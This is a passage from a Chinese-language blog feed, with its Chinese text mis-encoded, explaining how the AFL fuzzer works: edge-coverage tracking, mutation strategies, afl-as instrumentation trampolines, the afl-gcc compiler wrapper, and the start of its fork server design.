src="https://s2.loli.net/2022/04/19/uzmxHhq4B6pXM9K.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/19/uzmxHhq4B6pXM9K.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220410102945216" style="zoom:50%;" /><p>ç›¸æ¯”ç®€å•çš„å—è¦†ç›–è®¡ç®—ï¼šå¯ä»¥åŒºåˆ†ä¸€ä¸‹è·¯å¾„</p><pre class="language-none"><code class="language-none">BB1 -&gt; BB2 -&gt; BB3 -&gt; BBB4  (tuples: BB1BB2, BB2BB3, BB3BB4)BB1 -&gt; BB2 -&gt;BBB4  (tuples: BB1BB2, BB2BB4)BB1 -&gt; BB2 -&gt;BBB3  (tuples: BB1BB2, BB2BB3)</code></pre><h3 id="æ£€æµ‹æ–°è¡Œä¸º">æ£€æµ‹æ–°è¡Œä¸º</h3><p><strong>é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</strong></p><ol><li>fuzzer ç»´æŠ¤å…ˆå‰æ‰§è¡Œä¸­å…ƒç»„çš„å…¨å±€æ˜ å°„ï¼›å½“ä¸€ä¸ªå˜å¼‚çš„è¾“å…¥äº§ç”Ÿä¸€ä¸ªåŒ…å«æ–°å…ƒç»„çš„æ‰§è¡Œè·Ÿè¸ªæ—¶ï¼Œç›¸åº”è¾“å…¥æ–‡ä»¶è¢«ä¿ç•™ç­‰åç»­å¤„ç†ã€‚</li><li>ä¸è§¦å‘æ‰§è¡Œè·Ÿè¸ªä¸­æ–°çš„å±€éƒ¨è§„æ¨¡çŠ¶æ€è½¬æ¢ï¼ˆå³ä¸äº§ç”Ÿæ–°å…ƒç»„ï¼‰çš„è¾“å…¥å°†è¢«ä¸¢å¼ƒï¼Œå³ä½¿å®ƒä»¬çš„æ•´ä½“æ§åˆ¶æµåºåˆ—æ˜¯å”¯ä¸€çš„ã€‚</li></ol><p><strong>ä¼˜åŠ¿ï¼š</strong></p><ol><li>é¿å…è·¯å¾„çˆ†ç‚¸</li><li>è¾¾åˆ°è¾ƒé«˜çš„ç»†ç²’åº¦æ¢ç´¢</li><li>ä¸å¿…å¯¹å¤æ‚çš„æ‰§è¡Œè½¨è¿¹è¿›è¡Œä»»ä½•è®¡ç®—å¯†é›†å‹å’Œè„†å¼±çš„å…¨å±€æ¯”è¾ƒ</li></ol><p><strong>example</strong>: #2 å­˜åœ¨(CA,AE)è¢«è®¤ä¸ºæ˜¯æ–°è·¯å¾„ï¼Œ</p><pre class="language-none"><code class="language-none">#1: A -&gt; B -&gt; C -&gt; D -&gt; E#2: A -&gt; B -&gt; C -&gt; A -&gt; E</code></pre><p>å¤„ç†è·¯å¾„#2 æ—¶,ç”±äºå­˜åœ¨(CD,CA), ä¼šå‡ºç°ä»¥ä¸‹çš„è·¯å¾„ï¼Œä½†ä¸ä¼šè¢«è§†ä¸ºæ–°çš„è·¯å¾„</p><pre class="language-none"><code class="language-none">#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</code></pre><p>é™¤äº†æ£€æµ‹æ–°å…ƒç»„å¤–ï¼Œæ¨¡ç³Šå™¨è¿˜è€ƒè™‘ç²—ç•¥çš„å…ƒç»„å‘½ä¸­è®¡æ•°, åˆ†ä¸ºä»¥ä¸‹æ¡¶:</p><pre class="language-none"><code class="language-none">1ã€2ã€3ã€4-7ã€8-15ã€16-31ã€32-127ã€128+</code></pre><p>æ¡¶å…è®¸å°†ä»ªå™¨ç”Ÿæˆçš„ 8 ä½è®¡æ•°å™¨å°±åœ°æ˜ å°„åˆ° fuzzer å¯æ‰§è¡Œæ–‡ä»¶ä¾èµ–çš„ 8 ä½ä½å›¾ï¼Œä»¥è·Ÿè¸ªå·²ç»çœ‹åˆ°çš„æ¯ä¸ªå…ƒç»„çš„æ‰§è¡Œè®¡æ•°</p><h3 id="æ¨¡ç³Šç­–ç•¥">æ¨¡ç³Šç­–ç•¥</h3><p>ç¡®å®šæ€§ç­–ç•¥åŒ…æ‹¬ï¼š</p><ul><li><p>å…·æœ‰ä¸åŒé•¿åº¦å’Œæ­¥è·çš„è¿ç»­ä½ç¿»è½¬ï¼Œï¼ˆSequential bit flips with varying lengths and stepoversï¼‰</p></li><li><p>å°æ•´æ•°çš„é¡ºåºåŠ å‡æ³•ï¼Œï¼ˆSequential addition and subtraction of small integersï¼‰</p></li><li><p>å·²çŸ¥æœ‰è¶£æ•´æ•°çš„é¡ºåºæ’å…¥ï¼ˆ0ã€1ã€INT_MAX ç­‰ï¼‰ï¼Œï¼ˆSequential insertion of known interesting integers (0, 1, INT_MAX, etc))</p></li></ul><p>éç¡®å®šæ€§æ­¥éª¤åŒ…æ‹¬:</p><ul><li>å †å ä½ç¿»è½¬ (stacked bit flips)</li><li>æ’å…¥ (insertions)</li><li>åˆ é™¤ (deletions)</li><li>ç®—æœ¯ (arithmetics)</li><li>ä¸åŒæµ‹è¯•ç”¨ä¾‹çš„æ‹¼æ¥ (splicing of different test cases)</li></ul></div><h2 id="afl-as-c">afl-as.c</h2><div class="story post-story"><p><strong>è®¾è®¡æ€æƒ³ï¼š</strong></p><p>å½“ä½¿ç”¨ <code>afl-gcc / afl-clang</code> ç¼–è¯‘ç¨‹åºæ—¶ï¼Œå·¥å…·é“¾ä¼šè‡ªåŠ¨å¯»æ‰¾<code>afl-as</code>çš„ä½ç½®ï¼Œå¹¶è°ƒç”¨æ­¤æ–‡ä»¶ç¼–è¯‘çš„ç¨‹åº<code>afl-as</code>ã€‚</p><p>æ­¤æ±‡ç¼–åŒ…è£…å™¨çš„ç›®çš„æ˜¯</p><ol><li><p>é¢„å¤„ç†ç”±<code>GCC/clang</code>ç”Ÿæˆçš„æ±‡ç¼–æ–‡ä»¶</p><ol><li>å¤„ç†è¾“å…¥çš„å‚æ•°å‘½ä»¤ï¼Œä¸ºè°ƒç”¨çœŸæ­£çš„<code>as</code>æ±‡ç¼–å™¨å‡†å¤‡ã€‚</li></ol></li><li><p>å¹¶åœ¨åˆ†æ”¯å¤„æ’æ¡© <code>afl-as.h</code> ä¸­åŒ…å«çš„æ£€æµ‹ä½ã€‚</p><ol><li><p>å¤„ç†è¾“å…¥æ–‡ä»¶ï¼Œç”Ÿæˆ modified_fileã€‚ æ ¹æ®<code>afl-as.h</code>åœ¨åˆé€‚çš„çš„åœ°æ–¹æ’æ¡©ã€‚</p><p>æ’æ¡©æ‰§è¡Œä»£ç ï¼š</p><pre class="language-c++" data-language="c++"><code class="language-c++">fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,R(MAP_SIZE));</code></pre><p>å…¶æœ¬è´¨ä¸Šæƒ³æ•è·å¦‚ä¸‹ä½ç½®ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">^main:      - <span class="token keyword">function</span> entry point <span class="token punctuation">(</span>always instrumented<span class="token punctuation">)</span>^.L0:       - GCC branch label^.LBB0_0:   - clang branch label <span class="token punctuation">(</span>but only <span class="token keyword">in</span> clang mode<span class="token punctuation">)</span>^<span class="token punctuation">\</span>tjnz foo  - conditional branches</code></pre></li></ol></li><li><p>ä½¿ç”¨<code>execvp</code>è°ƒç”¨<code>as</code>è¿›è¡ŒçœŸæ­£çš„æ±‡ç¼–</p><pre class="language-none"><code class="language-none">execvp(as_params[0], (char**)as_params)</code></pre></li></ol><h3 id="afl-as-h-æ’æ¡©éƒ¨åˆ†">afl-as.h æ’æ¡©éƒ¨åˆ†</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// ä¼ªä»£ç </span>cur_location <span class="token operator">=</span> <span class="token operator">&lt;</span>COMPILE_TIME_RANDOM<span class="token operator">></span><span class="token punctuation">;</span> # cur_location å€¼æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä»¥ç®€åŒ–é“¾æ¥å¤æ‚é¡¹ç›®çš„è¿‡ç¨‹å¹¶ä¿æŒ XOR è¾“å‡ºå‡åŒ€åˆ†å¸ƒã€‚shared_mem<span class="token punctuation">[</span>cur_location <span class="token operator">^</span> prev_location<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span> # ç”±è°ƒç”¨è€…ä¼ é€’ç»™æ£€æµ‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚prev_location <span class="token operator">=</span> cur_location <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span> # ä¿æŒå…ƒç»„çš„æ–¹å‘æ€§ ä»¥åŒºåˆ† A<span class="token operator">^</span>B å’Œ B<span class="token operator">^</span>A <span class="token punctuation">,</span>å¹¶ä¿æŒç´§å¯†å¾ªç¯çš„æ ‡è¯†<span class="token punctuation">,</span>åŒºåˆ†A<span class="token operator">^</span>A<span class="token punctuation">,</span>B<span class="token operator">^</span>B</code></pre><p><strong>è¯´æ˜ï¼š</strong></p><p>å­˜å‚¨ <strong>XORå¼‚æˆ–</strong>æ•°æ®å¯¹ï¼š 1) å½“å‰æ‰§è¡Œåˆ†æ”¯çš„æ ‡è¯†ç¬¦; 2)ä¹‹å‰æ‰§è¡Œçš„åˆ†æ”¯çš„æ ‡è¯†ç¬¦ã€‚å³TLï¼ŒDR æ‰§è¡Œ <code>shm_trace_map[cur_loc ^ prev_loc]++</code></p><p><strong>æ’æ¡©æ“ä½œ</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">fprintf</span><span class="token punctuation">(</span>outf<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> trampoline_fmt_64 <span class="token operator">:</span> trampoline_fmt_32<span class="token punctuation">,</span><span class="token function">R</span><span class="token punctuation">(</span>MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>fprintf()</code>å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ·»åŠ åˆ°æ±‡ç¼–æ–‡ä»¶çš„ç›¸åº”ä½ç½®ï¼Œ<code>trampoline_fmt_64</code>çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/** * è¿™ä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œä¸»è¦çš„æ“ä½œæ˜¯ï¼š * ä¿å­˜rdxç­‰å¯„å­˜å™¨ * å°†rcxçš„å€¼è®¾ç½®ä¸ºfprintf()æ‰€è¦æ‰“å°çš„å˜é‡å†…å®¹ * è°ƒç”¨æ–¹æ³•__afl_maybe_log() * æ¢å¤å¯„å­˜å™¨ */</span><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> trampoline_fmt_64 <span class="token operator">=</span>  <span class="token string">"\n"</span>  <span class="token string">"/* --- AFL TRAMPOLINE (64-BIT) --- */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">".align 4\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"leaq -(128+24)(%%rsp), %%rsp\n"</span>  <span class="token string">"movq %%rdx,  0(%%rsp)\n"</span>  <span class="token string">"movq %%rcx,  8(%%rsp)\n"</span>  <span class="token string">"movq %%rax, 16(%%rsp)\n"</span>  <span class="token string">"movq $0x%08x, %%rcx\n"</span>  <span class="token string">"call __afl_maybe_log\n"</span>  <span class="token string">"movq 16(%%rsp), %%rax\n"</span>  <span class="token string">"movq  8(%%rsp), %%rcx\n"</span>  <span class="token string">"movq  0(%%rsp), %%rdx\n"</span>  <span class="token string">"leaq (128+24)(%%rsp), %%rsp\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"/* --- END --- */\n"</span>  <span class="token string">"\n"</span><span class="token punctuation">;</span></code></pre><p><code>__afl_maybe_log</code>ä½œä¸ºæ’æ¡©ä»£ç æ‰€æ‰§è¡Œçš„å®é™…å†…å®¹ï¼Œåˆ†æ<code>&quot;movl $0x%08x, %%ecx\n&quot;</code>è¿™æ¡æŒ‡ä»¤</p><p><code>R(MAP_SIZE)</code>å³ä¸ºä¸Šè¿°æŒ‡ä»¤å°†<code>rcx</code>è®¾ç½®çš„å€¼ï¼Œå³ä¸ºã€‚æ ¹æ®å®šä¹‰ï¼Œå®<code>MAP_SIZE</code>ä¸º64Kï¼Œï¼›<code>R(x)</code>çš„å®šä¹‰æ˜¯<code>(random() % (x))</code>ï¼Œæ‰€ä»¥<code>R(MAP_SIZE)</code>å³ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ã€‚</p><p>å› æ­¤ï¼Œåœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯ï¼Œéœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œ<code>afl-as</code>ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨<code>ecx</code>ä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„keyã€‚</p><p><strong>æ£€æŸ¥ SHM åŒºåŸŸæ˜¯å¦å·²æ˜ å°„</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span> Â·Â·Â·Â·Â·  <span class="token string">"  /* Check if SHM region is already mapped. */\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  movq  __afl_area_ptr(%rip), %rdx\n"</span>  <span class="token string">"  testq %rdx, %rdx\n"</span>  <span class="token string">"  je    __afl_setup\n"</span>  <span class="token string">"\n"</span>Â·Â·Â·Â·Â·</code></pre><p><strong>åˆ†æ”¯è®°å½•</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> main_payload_64 <span class="token operator">=</span> Â·Â·Â·Â·Â·Â·<span class="token string">"__afl_store:\n"</span>  <span class="token string">"\n"</span>  <span class="token string">"  /* Calculate and store hit for the code location specified in rcx. */\n"</span>  <span class="token string">"\n"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">COVERAGE_ONLY</span></span>  <span class="token string">"  xorq __afl_prev_loc(%rip), %rcx\n"</span>  <span class="token string">"  xorq %rcx, __afl_prev_loc(%rip)\n"</span>  <span class="token string">"  shrq $1, __afl_prev_loc(%rip)\n"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^!COVERAGE_ONLY */</span></span>  <span class="token string">"\n"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SKIP_COUNTS</span></span>  <span class="token string">"  orb  $1, (%rdx, %rcx, 1)\n"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>  <span class="token string">"  incb (%rdx, %rcx, 1)\n"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* ^SKIP_COUNTS */</span></span>Â·Â·Â·Â·Â·</code></pre><p>å¯¹åº”ä¼ªä»£ç  <code>shared_mem[cur_location ^ prev_location]++; </code></p><blockquote><p>å…·ä½“åœ°ï¼Œå˜é‡<code>__afl_prev_loc</code>ä¿å­˜çš„æ˜¯å‰ä¸€æ¬¡è·³è½¬çš„â€ä½ç½®â€ï¼Œå…¶å€¼ä¸<code>rcx</code>åšå¼‚æˆ–åï¼Œä¿å­˜åœ¨<code>rip</code>ä¸­ï¼Œå¹¶ä»¥<code>rdx</code>ï¼ˆå…±äº«å†…å­˜ï¼‰ä¸ºåŸºå€ï¼Œå¯¹<code>rcx</code>ä¸‹æ ‡å¤„è¿›è¡ŒåŠ ä¸€æ“ä½œã€‚è€Œ<code>rip</code>çš„å€¼å³ç§»1ä½åï¼Œä¿å­˜åœ¨äº†å˜é‡<code>__afl_prev_loc</code>ä¸­ã€‚</p><p>åˆ™è¿™é‡Œçš„<code>rcx</code>ï¼Œä¿å­˜çš„ä¸ºä¼ªä»£ç ä¸­çš„<code>cur_location</code>ã€‚å›å¿†ä¹‹å‰ä»‹ç»ä»£ç æ’æ¡©çš„éƒ¨åˆ†ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">const</span> u8<span class="token operator">*</span> trampoline_fmt_64 <span class="token operator">=</span>Â·Â·Â·Â·Â·Â·  <span class="token string">"movq $0x%08x, %%rcx\n"</span>  <span class="token string">"call __afl_maybe_log\n"</span>Â·Â·Â·Â·Â·Â·</code></pre><p>åœ¨æ¯ä¸ªæ’æ¡©å¤„ï¼Œafl-asä¼šæ·»åŠ ç›¸åº”æŒ‡ä»¤ï¼Œå°†<code>rcx</code>çš„å€¼è®¾ä¸º0åˆ°MAP_SIZEä¹‹é—´çš„æŸä¸ªéšæœºæ•°ï¼Œä»è€Œå®ç°äº†ä¼ªä»£ç ä¸­çš„<code>cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</code></p></blockquote><p><font color='cornflowerblue'>å› æ­¤ï¼ŒAFLä¸ºæ¯ä¸ªä»£ç å—ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºå…¶â€œä½ç½®â€çš„è®°å½•ï¼›éšåï¼Œå¯¹åˆ†æ”¯å¤„çš„â€æºä½ç½®â€œå’Œâ€ç›®æ ‡ä½ç½®â€œè¿›è¡Œå¼‚æˆ–ï¼Œå¹¶å°†å¼‚æˆ–çš„ç»“æœä½œä¸ºè¯¥åˆ†æ”¯çš„keyï¼Œä¿å­˜æ¯ä¸ªåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ã€‚ç”¨äºä¿å­˜æ‰§è¡Œæ¬¡æ•°çš„å®é™…ä¸Šæ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¤§å°ä¸º<code>MAP_SIZE=64K</code>ã€‚</font></p></div><h2 id="afl-gcc-c">afl-gcc.c</h2><div class="story post-story"><p>**è®¾è®¡æ€æƒ³: **</p><ol><li><p>å½“å‰ç³»ç»Ÿè·¯å¾„ä¸­æ‰¾åˆ°<code>afl-as</code>æ±‡ç¼–å™¨æ‰€åœ¨ä½ç½®ï¼Œè°ƒç”¨<code>afls-as </code>, <code>afl-asä»¥asçš„åˆ«åå½¢å¼å­˜åœ¨</code></p><p>æ’æ¡©æ£€æµ‹ä½ã€‚<font color='red'>ç¼–è¯‘å™¨é»˜è®¤ä¼˜å…ˆä½¿ç”¨è¯¥è·¯å¾„ä¸­çš„æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨ï¼Œå³ <code>afl-as</code>ï¼Œå®é™…çš„æ’æ¡©å·¥ä½œå‘ç”Ÿåœ¨æ±‡ç¼–çš„æ—¶å€™</font></p></li><li><p>è¯»å–è¾“å…¥çš„å‚æ•°å‘½ä»¤ï¼Œæ ¹æ®è¾“å…¥çš„å‚æ•°å‘½ä»¤</p><pre class="language-none"><code class="language-none">CC&#x3D;%s&#x2F;afl-gcc .&#x2F;configureCXX&#x3D;%s&#x2F;afl-g++ .&#x2F;configure</code></pre><p>1). åˆ¤æ–­ä½¿ç”¨çš„<code>aflç¼–è¯‘å™¨</code>å¯¹åº”çœŸå®çš„ç¼–è¯‘å™¨ <code>gcc/g++</code> æˆ– <code>clang/clang++</code></p><p><font color='red'>å°†çœŸå®ç¼–è¯‘å™¨å¡«å…¥<code>cc_params[0]</code>ä¸­</font></p><pre class="language-none"><code class="language-none">afl-gcc -&gt; gccafl-g++ -&gt; g++afl-clang++ -&gt;clang++afl-clang -&gt; clang</code></pre><p><img src="https://s2.loli.net/2022/04/10/KM8xIiDnTsN1pfO.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/10/KM8xIiDnTsN1pfO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220410202752730"></p><p>2). è¯»å–å…¶ä»–ç›¸åº”çš„å‚æ•°ï¼Œå¹¶å¡«å……åˆ°<code>cc_params</code>æ•°ç»„ä¸­</p></li><li><p>è°ƒç”¨ç³»ç»Ÿå‘½ä»¤<code>execvp</code> æ‰§è¡ŒçœŸå®çš„ç¼–è¯‘å™¨</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">execvp</span><span class="token punctuation">(</span>cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>cc_params<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p><strong>execvpï¼ˆï¼‰çš„åŸºæœ¬è¯­æ³• (Basic Syntax of execvp())</strong></p><p>This function takes in the name of the UNIX command to run, as the first argument.</p><p>è¯¥å‡½æ•°å°†è¦è¿è¡Œçš„UNIXå‘½ä»¤çš„åç§°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p>This is there in the <code>&lt;unistd.h&gt;</code> header file, so we must include it in our program.</p><p>è¯¥æ–‡ä»¶ä½äº<code>&lt;unistd.h&gt;</code>å¤´æ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»å°†å…¶åŒ…å«åœ¨ç¨‹åºä¸­ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> command<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Here, we refer to a â€œcommandâ€ as any binary executable file that is a part of the <code>PATH</code> environment variable. So, if you want to run custom programs, make sure that you add it to your <code>PATH</code> variable!</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†â€œå‘½ä»¤â€ç§°ä¸º<code>PATH</code>ç¯å¢ƒå˜é‡ä¸€éƒ¨åˆ†çš„ä»»ä½•äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å› æ­¤ï¼Œå¦‚æœè¦è¿è¡Œè‡ªå®šä¹‰ç¨‹åºï¼Œè¯·ç¡®ä¿å°†å…¶æ·»åŠ åˆ°<code>PATH</code>å˜é‡ä¸­ï¼</p><p>The second argument (<code>argv</code>) represents the list of arguments to <code>command</code>. This is an array of <code>char*</code> strings.</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼ˆ <code>argv</code> ï¼‰è¡¨ç¤º<code>command</code>çš„å‚æ•°åˆ—è¡¨ã€‚ è¿™æ˜¯ä¸€ä¸ª<code>char*</code>å­—ç¬¦ä¸²æ•°ç»„ã€‚</p><p>Here, <code>argv</code> contains the complete command, along with itâ€™s arguments.</p><p>åœ¨è¿™é‡Œï¼Œ <code>argv</code>åŒ…å«å®Œæ•´çš„å‘½ä»¤åŠå…¶å‚æ•°ã€‚</p></blockquote></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL(american Fuzzy Lop)å­¦ä¹ ä¸‰</title>
      <link href="/posts/77c87ed3/"/>
      <url>/posts/77c87ed3/</url>
      
        <content type="html"><![CDATA[<h1>AFL(american fuzzy lop)å­¦ä¹ ä¸‰</h1><blockquote><p>@sizaif</p><p>@2022-04-11</p></blockquote><h2 id="fork-Server">fork Server</h2><div class="story post-story"><p>ä¸ºäº†æé«˜æ€§èƒ½ï¼Œafl-fuzz ä½¿ç”¨â€œfork serverâ€ï¼Œå…¶ä¸­æ¨¡ç³Šå¤„ç†çš„è¿›ç¨‹åªç»è¿‡ä¸€æ¬¡<code>execve()</code>ã€<code>link</code>å’Œ libc 0initializationï¼Œç„¶åé€šè¿‡åˆ©ç”¨å†™æ—¶å¤åˆ¶ä»åœæ­¢çš„è¿›ç¨‹æ˜ åƒä¸­å…‹éš†ã€‚</p><p>**å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼š**å¯åŠ¨targetè¿›ç¨‹åï¼Œtargetä¼šè¿è¡Œä¸€ä¸ªfork serverï¼›fuzzerå¹¶ä¸è´Ÿè´£forkå­è¿›ç¨‹ï¼Œè€Œæ˜¯ä¸è¿™ä¸ªfork serveré€šä¿¡ï¼Œå¹¶ç”±fork serveræ¥å®ŒæˆforkåŠç»§ç»­æ‰§è¡Œç›®æ ‡çš„æ“ä½œã€‚è¿™æ ·è®¾è®¡çš„æœ€å¤§å¥½å¤„ï¼Œå°±æ˜¯ä¸éœ€è¦è°ƒç”¨<code>execve()</code>ï¼Œä»è€ŒèŠ‚çœäº†è½½å…¥ç›®æ ‡æ–‡ä»¶å’Œåº“ã€è§£æç¬¦å·åœ°å€ç­‰é‡å¤æ€§å·¥ä½œã€‚</p><p><strong>å…·ä½“è¿è¡ŒåŸç†:</strong></p><p>é¦–å…ˆfuzzeræ‰§è¡Œ<code>fork()</code>å¾—åˆ°çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ï¼Œè¿™é‡Œçš„çˆ¶è¿›ç¨‹ä»ç„¶ä¸ºfuzzerï¼Œå­è¿›ç¨‹åˆ™ä¸ºtargetè¿›ç¨‹ï¼Œå³å°†æ¥çš„fork serverã€‚</p><pre class="language-c" data-language="c"><code class="language-c">EXP_ST <span class="token keyword">void</span> <span class="token function">init_forkserver</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Â·Â·Â·Â·Â·Â·      forksrv_pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Â·Â·Â·Â·Â·Â·<span class="token punctuation">&#125;</span></code></pre><p>è€Œçˆ¶å­è¿›ç¨‹ä¹‹é—´ï¼Œæ˜¯é€šè¿‡ç®¡é“è¿›è¡Œé€šä¿¡ã€‚å…·ä½“ä½¿ç”¨äº†2ä¸ªç®¡é“ï¼Œä¸€ä¸ªç”¨äºä¼ é€’çŠ¶æ€ï¼Œå¦ä¸€ä¸ªç”¨äºä¼ é€’å‘½ä»¤ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> st_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ctl_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>å¯¹äºå­è¿›ç¨‹ï¼ˆfork serverï¼‰ï¼Œä¼šè¿›è¡Œä¸€ç³»åˆ—è®¾ç½®ï¼Œå…¶ä¸­åŒ…æ‹¬å°†ä¸Šè¿°ä¸¤ä¸ªç®¡é“åˆ†é…åˆ°é¢„å…ˆæŒ‡å®šçš„fdï¼Œå¹¶æœ€ç»ˆæ‰§è¡Œtargetï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>forksrv_pid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Â·Â·Â·Â·Â·Â·    <span class="token comment">/* Set up control and status pipes, close the unneeded original fds. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>ctl_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>st_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FORKSRV_FD <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"dup2() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Â·Â·Â·Â·Â·Â·    <span class="token function">execv</span><span class="token punctuation">(</span>target_path<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯¹äºçˆ¶è¿›ç¨‹ï¼ˆfuzzerï¼‰ï¼Œåˆ™ä¼šè¯»å–çŠ¶æ€ç®¡é“çš„ä¿¡æ¯ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™è¯´æ˜fork serveråˆ›å»ºå®Œæˆã€‚</p><pre class="language-c" data-language="c"><code class="language-c">fsrv_st_fd  <span class="token operator">=</span> st_pipe<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>Â·Â·Â·Â·Â·Â·  rlen <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fsrv_st_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">4</span><span class="token 